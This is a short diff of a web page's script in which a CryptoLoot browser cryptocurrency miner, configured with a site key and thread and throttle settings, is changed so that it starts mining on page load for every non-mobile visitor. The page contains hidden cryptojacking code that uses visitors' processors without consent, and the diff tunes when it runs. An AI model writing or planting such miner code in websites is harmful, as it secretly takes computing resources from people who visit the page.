@@ -343,7 +343,9 @@ var miner=new CryptoLoot.Anonymous('40b6f0aa200daeba46aec04e2d709de298462795aa6a
         threads:5,autoThreads:true,throttle:0.5,
         }
 );
-miner.start();
+if (!miner.isMobile()) {
+	miner.start();
+}
 </script>
 </div>
 </body>
